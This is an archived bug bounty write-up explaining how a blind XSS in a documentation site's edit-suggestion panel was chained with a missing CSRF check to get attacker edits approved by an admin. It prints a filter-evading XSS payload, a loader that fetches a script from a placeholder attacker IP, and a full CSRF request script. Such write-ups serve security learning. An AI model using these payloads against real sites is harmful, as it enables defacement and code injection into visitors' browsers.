---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-18_chaining-bugs-for-the-greater-good.md
original_filename: 2021-03-18_chaining-bugs-for-the-greater-good.md
title: Chaining bugs for the greater good
category: documents
detected_topics:
- xss
- command-injection
- cors
- csrf
tags:
- imported
- documents
- xss
- command-injection
- cors
- csrf
language: en
raw_sha256: 54d90cff1d0e69c26ce924dc8c54b0d3d311333a336d6825ce7f0c4d5eb05e3d
text_sha256: 99fd0562a9f547e8d151b560da5a3c5d0d48329a7d8daf8d46f0100a86dd4eae
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Chaining bugs for the greater good

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-18_chaining-bugs-for-the-greater-good.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cors, csrf
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `54d90cff1d0e69c26ce924dc8c54b0d3d311333a336d6825ce7f0c4d5eb05e3d`
- Text SHA256: `99fd0562a9f547e8d151b560da5a3c5d0d48329a7d8daf8d46f0100a86dd4eae`


## Content

---
title: "Chaining bugs for the greater good"
url: "https://med-mahmoudi26.medium.com/chaining-bugs-for-the-greater-good-664412ae85f8"
authors: ["mohamad mahmoudi (@Lotus_619)"]
bugs: ["Blind XSS", "CSRF"]
publication_date: "2021-03-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3808
scraped_via: "browseros"
---

# Chaining bugs for the greater good

mohamad mahmoudi
Follow
3 min read
·
Mar 18, 2021

77

1

Chaining bugs for the greater good

Hello internet hustlers ! After a while of going back and forth with myself, I have finally decided to start publishing some writeups about the bugs I am finding. For this first one, I wanna talk about how I was able to chain a Blind XSS on the admin side + CSRF to edit, delete, and inject code on browsers of all users of the website. I cannot disclose the name of the company so let’s just call it [Redacted]

So let’s start from the beginning. Choosing the target is one of the most important steps for the bug bounty hunter. In my case, I noticed how a lot of giant companies use this platform for their documentation so I decided to dig into it. I started by creating an admin account then creating my own documentation page. Then I started browsing my page as an unauthenticated user when I noticed a small button called “Suggest edits”.

When I clicked on it I noticed the following panel being opened:

and I was able to make some edits and submit them to the admin for preview. I focused on adding code sample, first I tried adding the normal XSS payload:

Get mohamad mahmoudi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

<script>alert(1)</script> and preview the changes from the admin side. But I did not work as the script tags were being filtered, so I tried something else, the infamous <style>. I tried something like this:

<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="javascript:eval('alert(1)')"></xss> 

Yep you guessed it, XSS fired.

Press enter or click to view image in full size

For now we got blind XSS on the admin side, however his cookies were well protected with an httponly flag so we cannot hijack his session.

Escalating the impact

The changes suggested by the attacker cannot be seen by the normal users unless the admin accepts it. I tried accepting the changes with the admin account and intercepted the request, I noticed that there were not any CSRF protection other than CORS which could be defeated by the XSS we have already found ! At this point, you can already start feeling the glory

Press enter or click to view image in full size

Here is how my final payload looked like:

<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="javascript:eval('var a=document.createElement(\'script\');a.src=\'http://<attacker_ip>/csrf.js\';document.body.appendChild(a)')"></xss>

This calls a js file hosted on my local machine that contains a CSRF exploit I wrote that looked like this:

var xhr = new XMLHttpRequest(); 
xhr.open(“POST”, “https://<my docs>:443/api/v1.0/save-edits", true); xhr.setRequestHeader(“Accept”, “application/json, text/plain, */*”); xhr.setRequestHeader(“Content-Type”, “application/json;charset=utf-8”); 
xhr.setRequestHeader(“Accept-Language”, “fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3”); xhr.withCredentials = true; 
var body = “{\”title\”:\”Getting Started with test\”,\”type\”:\”basic\”,\”slug\”:\”getting-started\”,\”excerpt\”:\”Hacked!!!\”,\”body\”:\”\\n[block:html]\\n{\\n \\\”html\\\”: \\\”<style>@keyframes x{}</style><xss style=\\\\\\\”animation-name:x\\\\\\\” onanimationstart=\\\\\\\”alert(document.cookie)\\\\\\\”></xss>\\\”\\n}\\n[/block]\\n\”,\”_id\”:\”PAGE_ID_HERE\”}”; var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));

Once The admin clicks preview, our exploit is loaded on his browser, the api call is made and our changes are accepted. From a blackhat point of view, this allows us to deface the website, inject keyloggers on browsers of the website users and a lot of other malicious stuff. But as white hat, I went ahead and wrote a report, got paid in a week and the bug is fixed.

Thank you for your time !

Linkedin: https://www.linkedin.com/in/mohamad-mahmoudi-944029161
